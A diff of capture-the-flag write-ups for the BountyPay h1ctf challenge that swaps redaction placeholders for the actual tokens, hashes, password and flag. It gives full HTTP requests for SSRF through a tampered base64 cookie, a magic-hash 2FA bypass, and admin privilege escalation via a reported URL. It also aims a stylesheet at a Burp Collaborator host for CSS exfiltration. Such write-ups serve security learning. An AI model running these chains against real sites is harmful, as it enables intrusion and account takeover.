+{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
 ```
 
 It's very interesting and unusual to see a parameter like `account_id` here, so let's take note of that.
@@ -11135,7 +11135,7 @@ The only other endpoint we can access, is the one that fetches statements:
 ```http
 GET /statements?month=04&year=2020 HTTP/1.1
 Host: app.bountypay.h1ctf.com
-Cookie: token=[REDACTED_SECRET]
+Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
 ```
 
 ```http
@@ -11149,12 +11149,12 @@ Just in case, I've tried to check a range of other year/month combinations (usin
 
 Looking at the response, it is clear the endpoint performs a server-side request to retrieve the data (and it also must have a valid token to authenticate with `api` subdomain). Somewhat unusually, it even shows us the full URL! This smells a lot like SSRF. First thing I've tried was fiddling with `month` and `year` parameters but it didn't yield anything interesting (and even if it did, it wouldn't be of much value as they are in query string, so we couldn't even do path traversal with that). What else can we control within this API request? It must be the account id that we saw in our session cookie before.. there's simply nothing else.
 
-And indeed  that worked. Let's try e.g. adding a `#` after the value: `{"account_id":"F8gHiqSdpK#","hash":"[REDACTED_SECRET]"}` (base64-encode it and use it as the cookie):
+And indeed  that worked. Let's try e.g. adding a `#` after the value: `{"account_id":"F8gHiqSdpK#","hash":"de235bffd23df6995ad4e0930baac1a2"}` (base64-encode it and use it as the cookie):
 
 ```http
 GET /statements?month=05&year=2020 HTTP/1.1
 Host: app.bountypay.h1ctf.com
-Cookie: token=[REDACTED_SECRET]==
+Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==
 ```
 
 ```http
@@ -11164,12 +11164,12 @@ Content-Type: application/json
 {"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK#\/statements?month=05&year=2020","data":"{\"account_id\":\"F8gHiqSdpK\",\"owner\":\"Mr Brian Oliver\",\"company\":\"BountyPay Demo \"}"}
 ```
 
-We even found another endpoint and got some data back for Brian, but it doesn't seem to be particularly useful. Recall now that we have a `software` subdomain which looked like an obvious target for SSRF. But we can only do Path Traversal so far. This is where we clearly need to chain Path Traversal with a redirect to access `software` subdomain. Our payload (decoded session cookie) thus becomes: `{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"[REDACTED_SECRET]"}`
+We even found another endpoint and got some data back for Brian, but it doesn't seem to be particularly useful. Recall now that we have a `software` subdomain which looked like an obvious target for SSRF. But we can only do Path Traversal so far. This is where we clearly need to chain Path Traversal with a redirect to access `software` subdomain. Our payload (decoded session cookie) thus becomes: `{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}`
 
 ```http
 GET /statements?month=05&year=2020 HTTP/1.1
 Host: app.bountypay.h1ctf.com
-Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/[REDACTED_SECRET]=
+Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS8jIiwiaGFzaCI6ImRlMjM1YmZmZDIzZGY2OTk1YWQ0ZTA5MzBiYWFjMWEyIn0=
 ```
 
 This presents us with a login panel. Extracting HTML from JSON response and prettifying it gives us:
@@ -11212,7 +11212,7 @@ This presents us with a login panel. Extracting HTML from JSON response and pret
 
 There isn't much we can do with it since SSRF only allows us to do `GET` requests and not `POST`. What else? As usual, content discovery.  This one is a little bit more tricky to setup since the payload is base64-encoded, but it can still be easily done in Burp. We need to set the whole session cookie value as the target,  and add 3 `Payload Processing` rules:
 1. "Add prefix" with value `{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/`
-2. "Add suffix" with value `#","hash":"[REDACTED_SECRET]"}`      (the part between them will be our actual payload for content discovery)
+2. "Add suffix" with value `#","hash":"de235bffd23df6995ad4e0930baac1a2"}`      (the part between them will be our actual payload for content discovery)
 3.  "Encode" -> "Base64-encode"
 {F861592}
 
@@ -11221,7 +11221,7 @@ I've used a fairly simple wordlist and got a hit pretty quickly - there is an `/
 ```http
 GET /statements?month=05&year=2020 HTTP/1.1
 Host: app.bountypay.h1ctf.com
-Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/[REDACTED_SECRET]==
+Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3RmLmNvbS91cGxvYWRzLyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==
 ```
 HTML code extracted from JSON response is:
 ```html
@@ -11273,7 +11273,7 @@ The steps I've taken to set up my environment were as follows:
 
 I've also set up traffic proxying through Burp:
 1. Configure proxy in the Emulator's settings as described [here](https://developer.android.com/studio/run/emulator-networking).
-2. Install Burp's CA certificate on the device. You can follow Burp guide [here](https://portswigger.net/support/[REDACTED_SECRET]) but I find it easier to push the certificate to device's SD card using `adb` (as opposed to sending it via email):
+2. Install Burp's CA certificate on the device. You can follow Burp guide [here](https://portswigger.net/support/installing-burp-suites-ca-certificate-in-an-android-device) but I find it easier to push the certificate to device's SD card using `adb` (as opposed to sending it via email):
 
 ```bash
 $ adb push cacert.cer /mnt/sdcard
@@ -11385,7 +11385,7 @@ Since I already read the entire source code I knew the answer for it. Within `Pa
 ```java
 byte[] decodedDirectoryTwo = Base64.decode("WC1Ub2tlbg==", 0);
 ```
-When decoded, this value is `X-Token`, and that's exactly the header value we need to enter. You can also see an MD5 hash on the screen, `[REDACTED_SECRET]`. Googling this value tells us that this is the hash for the word `Token`. It was hinting at the fact that the Header of interest is `X-Token`.
+When decoded, this value is `X-Token`, and that's exactly the header value we need to enter. You can also see an MD5 hash on the screen, `459a6f79ad9b13cbcb5f692d2cc7a94d`. Googling this value tells us that this is the hash for the word `Token`. It was hinting at the fact that the Header of interest is `X-Token`.
 
 When I tried it, it didn't work. Checking the process log within Android Studio, I saw:
 ```
@@ -11491,7 +11491,7 @@ generic_x86_arm:/data/data/bounty.pay/shared_prefs $ cat user_created.xml
     <string name="HOST">http://api.bountypay.h1ctf.com</string>
     <string name="PARTONE">COMPLETE</string>
     <string name="TWITTERHANDLE">nirvana_msu</string>
-    <string name="TOKEN">[REDACTED_SECRET]</string>
+    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
 </map>
 ```
 
@@ -11558,19 +11558,19 @@ Complete
 This reveals the input to submit the leaked hash:
 {F862959}
 
-I entered the token `[REDACTED_SECRET]` and was presented with the final screen, confirming that Android challenges were complete. There was also a rather obvious message that `Information leaked here will help with other challenges.`:
+I entered the token `8e9998ee3137ca9ade8f372739f062c1` and was presented with the final screen, confirming that Android challenges were complete. There was also a rather obvious message that `Information leaked here will help with other challenges.`:
 {F862964}
 
 ## Social Media
 
-Ok, so from the whole of Android challenge, we understood that we could use the header `X-Token: [REDACTED_SECRET]` with the host `http://api.bountypay.h1ctf.com`.
+Ok, so from the whole of Android challenge, we understood that we could use the header `X-Token: 8e9998ee3137ca9ade8f372739f062c1` with the host `http://api.bountypay.h1ctf.com`.
 
 And indeed we can confirm it works as authentication for the API endpoints:
 
 ```http
 GET /api/accounts/F8gHiqSdpK/statements?month=05&year=2020 HTTP/1.1
 Host: api.bountypay.h1ctf.com
-X-Token: [REDACTED_SECRET]
+X-Token: 8e9998ee3137ca9ade8f372739f062c1
 ```
 
 ```http
@@ -11587,7 +11587,7 @@ Endpoints known to us so far under `/api` did not respond to POST requests - so 
 ```http
 POST /api/staff HTTP/1.1
 Host: api.bountypay.h1ctf.com
-X-Token: [REDACTED_SECRET]
+X-Token: 8e9998ee3137ca9ade8f372739f062c1
 ```
 
 ```http
@@ -11600,7 +11600,7 @@ So we're missing some parameter. Checking the GET request for the same endpoint:
 ```http
 GET /api/staff HTTP/1.1
 Host: api.bountypay.h1ctf.com
-X-Token: [REDACTED_SECRET]
+X-Token: 8e9998ee3137ca9ade8f372739f062c1
 ```
 
 ```http
@@ -11614,7 +11614,7 @@ we see a new parameter, `staff_id`. Back to the POST endpoint, trying one of tho
 POST /api/staff HTTP/1.1
 Host: api.bountypay.h1ctf.com
 Content-Type: application/x-www-form-urlencoded
-X-Token: [REDACTED_SECRET]
+X-Token: 8e9998ee3137ca9ade8f372739f062c1
 
 staff_id=STF:KE624RQ2T9
 ```
@@ -11644,7 +11644,7 @@ Finally I issued the `POST` request to `/api/staff` with Sandra's Staff ID, and 
 ```http
 POST /api/staff HTTP/1.1
 Host: api.bountypay.h1ctf.com
-X-Token: [REDACTED_SECRET]
+X-Token: 8e9998ee3137ca9ade8f372739f062c1
 Content-Type: application/x-www-form-urlencoded
 
 staff_id=STF:8FJ3KFISL3
@@ -11668,7 +11668,7 @@ Logging in to Staff portal as Sandra and looking through all HTML and JS sources
 	```http
 	GET /js/website.js HTTP/1.1
 	Host: staff.bountypay.h1ctf.com
-	Cookie: token=[REDACTED_SECRET]
+	Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
 	```
 
 	```js
@@ -11707,7 +11707,7 @@ First thing I tried was to hit the priv esc endpoint directly:
 ```http
 GET /admin/upgrade?username=sandra.allison HTTP/1.1
 Host: staff.bountypay.h1ctf.com
-Cookie: token=[REDACTED_SECRET]
+Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
 ```
 ```http
 HTTP/1.1 401 Unauthorized
@@ -11721,7 +11721,7 @@ Ok, so it's fairly clear that our goal to make Admin issue this GET request for 
 GET /admin/report?url=L2FkbWluL3VwZ3JhZGU/dXNlcm5hbWU9c2FuZHJhLmFsbGlzb24= HTTP/1.1
 Host: staff.bountypay.h1ctf.com
 X-Requested-With: XMLHttpRequest
-Cookie: token=[REDACTED_SECRET]
+Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH
 ```
 ```http
 HTTP/1.1 200 OK
@@ -11736,7 +11736,7 @@ At this point I went the wrong way and tried loads of different things, all lead
 * I tried to see if Admin would access an external URL, such as Burp Collaborator. I tried a number of tricks that wold normally be used for an Open Redirect bypass, but none worked.
 * I though that  `Pages in the /admin directory will be ignored for security` message could be quite literal - maybe there's e.g .a regex check that a path starts with `/admin` that could be bypassed. I tried a number of things like path traversal, using `\` instead of `/` etc but nothing worked.
 * By this point I still didn't realize SQLi hint was a troll, so I fired up sqlmap again. I've even tried injections within the reported pages - in case something worked differently for Admin than for us.
-* The support ticket functionality reminded me of [Ticket Trick](https://medium.com/intigriti/[REDACTED_SECRET]), so I tried sending a few emails to addresses like `support@staff.bountypay.h1ctf.com` - all bounced back.
+* The support ticket functionality reminded me of [Ticket Trick](https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c), so I tried sending a few emails to addresses like `support@staff.bountypay.h1ctf.com` - all bounced back.
 * We don't have XSS with `profile_name` and `profile_avatar` parameters, but maybe we have [SSTI](https://portswigger.net/research/server-side-template-injection)? Curly braces were filtered out as well..
 
 I was clearly going down the rabbit hole, especially with that SQLi trolling, so I pinged [@xEHLE_](https://twitter.com/xEHLE_) for a reality check, and he confirmed that I was on the right path originally with trying to make Admin visit the priv esc endpoint, and that I was just overlooking something in the javascript code. And indeed, looking more closely at the jQuery selectors I realised they were too loose and just selected the element(s) based on a class name, and not id: `$(".upgradeToAdmin").click`.
@@ -11745,12 +11745,12 @@ The pieces of the puzzle immediately came together. Coincidentally, we have cont
 
 1. Change our `profile_avatar` to `upgradeToAdmin tab4`. `tab4` class (together with `#tab4` in the URL) is needed so that the element would be clicked on, and `upgradeToAdmin` class ensures the desired jQuery callback would fire.
 2. `profile_avatar`is reflected within our home page, but it's of no use to us since when Admin access the reported page, it would show his details and not ours. We need a page where Admin user would still have our `profile_avatar` reflected, and that's exactly the ticket page!
-3. We thus report `/?template=ticket&ticket_id=3582#tab4`, which base64-encoded is `[REDACTED_SECRET]==`:
+3. We thus report `/?template=ticket&ticket_id=3582#tab4`, which base64-encoded is `Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiNA==`:
 
 ```http
-GET /admin/report?url=[REDACTED_SECRET]== HTTP/1.1
+GET /admin/report?url=Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiNA== HTTP/1.1
 Host: staff.bountypay.h1ctf.com
-Cookie: token=[REDACTED_SECRET]
+Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09
 ```
 ```http
 HTTP/1.1 200 OK
@@ -11779,7 +11779,7 @@ I immediately tried turning template parameter into an array, in the hope that t
 ```http
 GET /?template[]=ticket&ticket_id=3582&template[]=login&username=sandra.allison HTTP/1.1
 Host: staff.bountypay.h1ctf.com
-Cookie: token=[REDACTED_SECRET]
+Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09
 ```
 
 ```html
@@ -11879,7 +11879,7 @@ Cookie: token=[REDACTED_SECRET]
 <script src="/js/jquery.min.js"></script>
 <script src="/js/bootstrap.min.js"></script>
 <script>
-    var url = '[REDACTED_SECRET]';
+    var url = 'Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29u';
 </script>
 <script src="/js/website.js"></script>
 </body>
@@ -11926,24 +11926,24 @@ Back the the CTF - note that conveniently, we can also set the value for the `us
 
 I then reported the following URL: `/?template[]=ticket&ticket_id=3582&template[]=login&username=sandra.allison#tab4`
 ```http
-GET /admin/report?url=[REDACTED_SECRET]= HTTP/1.1
+GET /admin/report?url=Lz90ZW1wbGF0ZVtdPXRpY2tldCZ0aWNrZXRfaWQ9MzU4MiZ0ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ= HTTP/1.1
 Host: staff.bountypay.h1ctf.com
 X-Requested-With: XMLHttpRequest
-Cookie: token=[REDACTED_SECRET]
+Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09
 ```
 and ... nothing happened. Visiting that URL directly in the browser I saw that the request was still being made to `/admin/upgrade?username=undefined`. Of course, that makes sense. Javascript (unless loaded asynchronously) is evaluated immediately when it is encountered in the DOM, meaning that it only has access to DOM elements that precede it. I've put the templates in the wrong order, and `username` input simply didn't exist on the page yet when our code was executed.
 
 Finally, I reversed the order of templates: `/?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab4`
 ```http
-GET /admin/report?url=[REDACTED_SECRET]= HTTP/1.1
+GET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyI3RhYjQ= HTTP/1.1
 Host: staff.bountypay.h1ctf.com
 X-Requested-With: XMLHttpRequest
-Cookie: token=[REDACTED_SECRET]
+Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYld3czZSUG9McFZ4TWlCSGtVR3lDU3FycUZGUjY0QXNHclN6dzhLTUpjUEJ6c3Z5VmIwNnRMSmFMTzZYR0FrTURqY0NsMDY0bVkrQzE3UT09
 ```
 ```http
 HTTP/1.1 200 OK
 Content-Type: application/json
-Set-Cookie: token=[REDACTED_SECRET]; expires=Mon, 06-Jul-2020 23:09:22 GMT; Max-Age=2592000; path=/
+Set-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOVM5N0IvVGtnM2g3TmhWU0lENlV5WVJLRHlmRlZMRXZqTzFPaWQ0bDA0M2xZdXozYkJqRURhdXczckZGTWlCSGtVR3lDU3FycUZGUjY0QXNHOWlLbi9xY0pkUFIxdnFpV1B4V3JmY3JhT3ZqQ1ZFVlpnYzMzaFAxMllyUzE3UT09; expires=Mon, 06-Jul-2020 23:09:22 GMT; Max-Age=2592000; path=/
 
 ["Report received"]
 ```
@@ -11962,11 +11962,11 @@ POST / HTTP/1.1
 Host: app.bountypay.h1ctf.com
 Content-Type: application/x-www-form-urlencoded
 
-username=marten.mickos&password=h%26H5wy2Lggj*kKn4OD%26Ype&challenge=[REDACTED_SECRET]&challenge_answer=bD83Jk27dQ
+username=marten.mickos&password=h%26H5wy2Lggj*kKn4OD%26Ype&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
 ```
 ```http
 HTTP/1.1 302 Found
-Set-Cookie: token=[REDACTED_SECRET]; expires=Mon, 06-Jul-2020 23:56:57 GMT; Max-Age=2592000
+Set-Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9; expires=Mon, 06-Jul-2020 23:56:57 GMT; Max-Age=2592000
 Location: /
 ```
 
@@ -11979,10 +11979,10 @@ When we click Pay, however, we're presented with another 2FA challenge:
 Ok. let's intercept the next request (when we click on "Send Challenge" button) and see what it looks like:
 
 ```http
-POST /pay/17538771/[REDACTED_SECRET] HTTP/1.1
+POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
 Host: app.bountypay.h1ctf.com
 Content-Type: application/x-www-form-urlencoded
-Cookie: token=[REDACTED_SECRET]
+Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
 
 app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
 ```
@@ -11992,7 +11992,7 @@ And the relevant HTML snippet from the response:
 <h3 class="text-center">2FA Payment Challenge</h3>
 <form method="post">
 	<input type="hidden" name="challenge_timeout" value="1591490942">
-	<input type="hidden" name="challenge" value="[REDACTED_SECRET]">
+	<input type="hidden" name="challenge" value="2cf37bd3c17d4621658828b374579adb">
 	<div class="panel panel-default" style="margin-top:50px">
 		<div class="panel-heading">Payment Challenge Sent</div>
 		<div class="panel-body text-center">
@@ -12010,10 +12010,10 @@ This seems a lot like we're going to need to exfiltrate `challenge_answer`with C
 Firstly, I've made a request using Burp Collaborator payload to confirm we can fetch a stylesheet from an arbitrary external resource:
 
 ```http
-POST /pay/17538771/[REDACTED_SECRET] HTTP/1.1
+POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
 Host: app.bountypay.h1ctf.com
 Content-Type: application/x-www-form-urlencoded
-Cookie: token=[REDACTED_SECRET]
+Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
 
 app_style=https://u1w9neu3o71nmwn6ryh9o7zbg2msah.burpcollaborator.net/css/uni_2fa_style.css
 ```
@@ -12024,7 +12024,7 @@ A few things are worth noting when inspecting the request received by Collaborat
 1. `User-Agent` tells us that request was made from Headless Chrome. 
 2. [`Sec-Fetch-Dest: style`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Dest) tells us that the resource would be embedded as a stylesheet (using `<link ... rel="stylesheet">`)
 
-Given that we only have a single injection point, I assumed the task would be to exfiltrate `challenge_answer ` characters recursively. I was well aware of the relatively-recent technique for sequential exfiltration using `@import` directives, which you can read about in a brilliant blog post titled [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/[REDACTED_SECRET]) by [@d0nutptr](https://twitter.com/d0nutptr). Worth mentioning that a similar technique was [first discovered](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) half a year before by [Vila](https://twitter.com/cgvwzq). Note that this technique works in Chrome because Chrome processes `@import` directives asynchronously (executing the rest of CSS code while additional resources load). This, for instance, is not the case for Firefox that executes them sequentially, as was demonstrated by [Michał Bentkowski](https://twitter.com/securitymb) in another excellent blog post on this subject, titled [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/[REDACTED_SECRET]/).
+Given that we only have a single injection point, I assumed the task would be to exfiltrate `challenge_answer ` characters recursively. I was well aware of the relatively-recent technique for sequential exfiltration using `@import` directives, which you can read about in a brilliant blog post titled [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) by [@d0nutptr](https://twitter.com/d0nutptr). Worth mentioning that a similar technique was [first discovered](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) half a year before by [Vila](https://twitter.com/cgvwzq). Note that this technique works in Chrome because Chrome processes `@import` directives asynchronously (executing the rest of CSS code while additional resources load). This, for instance, is not the case for Firefox that executes them sequentially, as was demonstrated by [Michał Bentkowski](https://twitter.com/securitymb) in another excellent blog post on this subject, titled [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/).
 
 So the fact that page was loaded in Headless Chrome reaffirmed my intuition that we're after sequential exfiltration using `@import` directives. d0nutptr actually wrote a [sic](https://github.com/d0nutptr/sic) tool available on GitHub that could be used to execute such an attack, but I wanted to try this for myself so I wrote the necessary exploit in Python..... only to realise that it's not actually possible. As I have realized, Chrome only loads `@import` resources asynchronously when they appear within `<style>` elements in HTML. When they appear in the external stylesheets using `<link>` tag, however, Chrome stops CSS evaluation until the resource is loaded. It means that in our case sequential exfiltration isn't actually possible.
 
@@ -12269,9 +12269,9 @@ Tools
 
 Techniques / Blog posts
 * [Subdomain Enumeration: 2019 Workflow](https://0xpatrik.com/subdomain-enumeration-2019/) by [Patrik Hudak](https://twitter.com/0xpatrik) 
-* [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/[REDACTED_SECRET]) by [@d0nutptr](https://twitter.com/d0nutptr)
+* [Better Exfiltration via HTML Injection](https://medium.com/@d0nut/better-exfiltration-via-html-injection-31c72a2dae8b) by [@d0nutptr](https://twitter.com/d0nutptr)
 * [CSS Injection Attacks](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) by  [Pepe Vila](https://twitter.com/cgvwzq)
-* [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/[REDACTED_SECRET]/) by [Michał Bentkowski](https://twitter.com/securitymb)
+* [CSS data exfiltration in Firefox via a single injection point](https://research.securitum.com/css-data-exfiltration-in-firefox-via-single-injection-point/) by [Michał Bentkowski](https://twitter.com/securitymb)
 * [CSS character escape sequences](https://mathiasbynens.be/notes/css-escapes) by [Mathias Bynens](https://twitter.com/mathias)
 
 ## Impact
@@ -12366,7 +12366,7 @@ For this report, I'll try to define for each step :
 Thank you to any reviewer for his/her time on this.
 
 The final flag is :
-`^FLAG^[REDACTED_SECRET]$FLAG$`
+`^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`
 
 # Step 1 - It all starts with recon
 
@@ -12449,7 +12449,7 @@ I instantly thought about magic hashes (or type juggling)
 got the first one from this [file](https://github.com/spaze/hashes/blob/master/md5.md) and tried it aaaaand it worked ! (I was really proud to think about it this fast and to get it on the first try !).
 
 So here's the payload that allowed me to bypass the 2FA :
-`username=brian.oliver&password=V7h0inzX&challenge=[REDACTED_SECRET]&challenge_answer=240610708`
+`username=brian.oliver&password=V7h0inzX&challenge=0e462097431906509019562988736854&challenge_answer=240610708`
 
 And we're now logged in !
 
@@ -12466,7 +12466,7 @@ Every user accessible input needs to be sanitized before being used in an applic
 
 ## In-depth explanation
 When logged in, we get a token :
-`[REDACTED_SECRET]` which once decoded from base64 gives us `{"account_id":"F8gHiqSdpK","hash":"[REDACTED_SECRET]"}`.
+`eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9` which once decoded from base64 gives us `{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}`.
 
 When we look back at the decoded logs, we see that the user was requesting the `/statements` endpoint, and when we try to request it we get :
 
@@ -12479,7 +12479,7 @@ We now know that the account requested is the value we have inside the token, so
 The first problem was that I needed to ignore the last part of the request : `/statements?month=01&year=2020` because even if we had a properly working SSRF or LFI, the *statements* part would be a problem.
 After trying some things that didn't work, I thought about the HTML anchors that are defined by a #.
 so I tried adding `/#` to my account_id and sending it :
-`{"account_id":"F8gHiqSdpK/#","hash":"[REDACTED_SECRET]"}`
+`{"account_id":"F8gHiqSdpK/#","hash":"de235bffd23df6995ad4e0930baac1a2"}`
 
 and got a response that contained some more information : 
 
@@ -12489,7 +12489,7 @@ By then, I was pretty sure I had to play with that account id to get either a LF
 
 after some tries, I managed to access to the software domain using this payload :
 
-`{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"[REDACTED_SECRET]"}`
+`{"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#","hash":"de235bffd23df6995ad4e0930baac1a2"}`
 
 {F859884}
 
@@ -12583,7 +12583,7 @@ now we get some things printed on the screen :
 
 {F859877}
 
-so we have a md5 string `[REDACTED_SECRET]` and a submit, the first thing I tried is to check if the md5 is in the [crackstation](https://crackstation.net/) database.
+so we have a md5 string `459a6f79ad9b13cbcb5f692d2cc7a94d` and a submit, the first thing I tried is to check if the md5 is in the [crackstation](https://crackstation.net/) database.
 
 {F859876} 
 
@@ -12673,7 +12673,7 @@ We could see that leaked hash in 3 different places :
 * We can also see it in logcat by using `adb logcat TOKEN:V` while sending the previous `am start` command.
 * We can see it in Burp proxy if the emulator has the Burp certificate installed, because it is send in a request.
 
-So this famous `leaked hash` is equal to `[REDACTED_SECRET]`.
+So this famous `leaked hash` is equal to `8e9998ee3137ca9ade8f372739f062c1`.
 
 After inputting this hash in the text field, we get this screen :
 
@@ -12701,7 +12701,7 @@ Making sure you don't leak any token, and properly training employees about what
 ## In-depth explanation
 This part was probably my biggest time loss in comparison to what I was supposed to do.
 
-From what I've gathered from the apk, I know I need to use a `X-Token: [REDACTED_SECRET]` on the api.
+From what I've gathered from the apk, I know I need to use a `X-Token: 8e9998ee3137ca9ade8f372739f062c1` on the api.
 after trying to use it on every endpoint I knew, I began thinking that was not the good place. So I started to request every domain, and every endpoint previously found with that same header.
 
 After seeing all of this didn't work, I went back to the apk to check what was the part that was doing a request to see if I missed something :
@@ -12770,7 +12770,7 @@ After hours of searching on every other domain and on api, I went back to the `/
 When I issued the first request (screenshot above), there was a space between the `X-Token` and the `:`...
 So I finally got what I'm looking for !
 `[{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}]`
